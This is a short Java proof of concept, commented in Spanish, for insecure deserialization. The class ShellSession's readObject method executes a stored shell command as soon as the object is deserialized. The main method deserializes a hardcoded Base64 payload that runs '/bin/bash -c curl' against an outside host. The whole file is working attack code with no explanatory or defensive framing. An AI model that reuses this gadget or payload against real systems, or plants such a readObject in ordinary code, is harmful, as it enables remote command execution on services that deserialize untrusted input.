import java.io.*;
import java.util.Base64;

public class ShellSession implements Serializable {
    private static final long serialVersionUID = 1L;

    private String[] command;

    public ShellSession(String[] command) {
        this.command = command;
    }

    // Ejecuta el comando al deserializar
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(command);
    }

    // Serializa el objeto y devuelve el array de bytes
    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
        ObjectOutputStream objectStream = new ObjectOutputStream(byteStream);
        objectStream.writeObject(obj);
        objectStream.close();
        return byteStream.toByteArray();
    }

    // Deserializa el objeto desde una cadena Base64
    public static void deserialize(String base64Data) throws IOException, ClassNotFoundException {
        // Decodificar la cadena Base64 a un array de bytes
        byte[] data = Base64.getDecoder().decode(base64Data);

        // Deserializar el objeto desde el array de bytes
        ObjectInputStream objectStream = new ObjectInputStream(new ByteArrayInputStream(data));
        objectStream.readObject();
        objectStream.close();
    }

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        // Definir comando como array de strings
        //String[] command = {"/bin/bash", "-c", "curl www.sapo.shk0x.net"};

        // Crear el objeto ShellSession con el comando especificado
        //ShellSession session = new ShellSession(command);

        // Serializar el objeto y convertirlo a Base64
        //byte[] serializedData = serialize(session);
        //String base64String = Base64.getEncoder().encodeToString(serializedData);
        //System.out.println("Objeto serializado en Base64: " + base64String);

        // Deserializar el objeto desde la cadena Base64
        System.out.println("Deserializando el objeto desde Base64...");
        String otro = "rO0ABXNyAAxTaGVsbFNlc3Npb24AAAAAAAAAAQIAAVsAB2NvbW1hbmR0ABNbTGphdmEvbGFuZy9TdHJpbmc7eHB1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAADdAAJL2Jpbi9iYXNodAACLWN0ABdjdXJsIHd3dy5zYXBvLnNoazB4Lm5ldA==";
        deserialize(otro);
    }
}
